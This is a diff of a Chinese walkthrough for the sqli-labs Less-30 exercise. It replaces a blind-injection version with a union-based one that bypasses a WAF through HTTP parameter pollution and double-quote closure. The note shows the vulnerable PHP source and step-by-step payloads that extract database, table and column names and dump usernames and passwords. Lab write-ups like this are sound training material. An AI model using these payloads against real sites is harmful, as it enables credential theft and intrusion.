@@ -1,51 +1,72 @@
-# Less-30 HPP + 盲注组合绕过
+# Less-30 （HPP + 双引号包裹）
 
-## 核心原理
+## 查看分析源码
 
-Less 30 = Less 29 的 HPP 结构 + 无回显（盲注）
-- WAF 检查第一个 `id` 参数
-- 后端取最后一个 `id` 参数
-- 页面不回显数据 → 需盲注
+和 Less-29 的 HPP 结构一样，但多了双引号包裹，没了报错：
 
-## 绕过步骤
+```php
+$qs = $_SERVER['QUERY_STRING'];
+$id1 = java_implimentation($qs);             // 取第一个 id → WAF 检查
+whitelist($id1);
 
-### 第一步：确认 HPP 可用
-```sql
-?id=1&id=-1' union select 1,2,3--+
-```
-如果报错变化或延时，说明参数传递成功。
+$id = $_GET['id'];                           // PHP 取最后一个 id
+$id = '"' .$id. '"';                         // ★ 双引号裹上
 
-### 第二步：时间盲注
-```sql
--- 判断注入点
-?id=1&id=1' and sleep(3)--+
-
--- 二分法猜数据库名长度
-?id=1&id=1' and if(length(database())=8,sleep(2),0)--+
-
--- 逐个字符猜解（二分法）
-?id=1&id=1' and if(ascii(substr(database(),1,1))>115,sleep(2),0)--+  -- 是 s
-?id=1&id=1' and if(ascii(substr(database(),1,1))=115,sleep(2),0)--+  -- 确认
+$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
+// print_r(mysql_error());                    // 没报错
 ```
 
-### 第三步：批量猜表名
-```sql
--- 猜第一个表的第一个字符
-?id=1&id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100,sleep(2),0)--+
-```
+输出逻辑：数据正常时 username/password 正常显示，失败时啥都不显示，不是盲注，只是没报错而已。
 
-## 布尔盲注模板
-
-如果页面有 True/False 差异（比如 id=1 正常，id=2 不正常）：
-
-```sql
--- 布尔盲注
-?id=1&id=1' and substr(database(),1,1)='s'--+    -- 页面正常
-?id=1&id=1' and substr(database(),1,1)='x'--+    -- 页面异常
-```
-
-## 完整盲注流程图
+## 原理
 
 ```
-确认注入 → 判断库长 → 猜库名 → 猜表数 → 猜表长 → 猜表名 → 猜列数 → 猜列名 → 脱裤
+?id=1&id=-1" union select 1,2,3--+
+    ↑                ↑
+  WAF看第一个       PHP用最后一个
 ```
+
+双引号闭合，所以 payload 里用双引号：
+
+```
+id="-1" union select 1,2,3--+"
+```
+
+## order by
+
+```
+?id=1&id=1" order by 3--+
+?id=1&id=1" order by 4--+
+```
+
+## 回显位
+
+```
+?id=1&id=-1" union select 1,2,3--+
+```
+
+## 爆库名
+
+```
+?id=1&id=-1" union select 1,database(),3--+
+```
+
+## 爆表名
+
+```
+?id=1&id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
+```
+
+## 爆列名
+
+```
+?id=1&id=-1" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
+```
+
+## 爆数据
+
+```
+?id=1&id=-1" union select 1,group_concat(username,0x3a,password),3 from users--+
+```
+
+总结：Less-30 = Less-29 的结构 + 双引号闭合 + 无报错。不是盲注——数据正常时一样显示结果。有报错没报错只影响你调试时看不看得到错误信息，不影响注入拿数据。
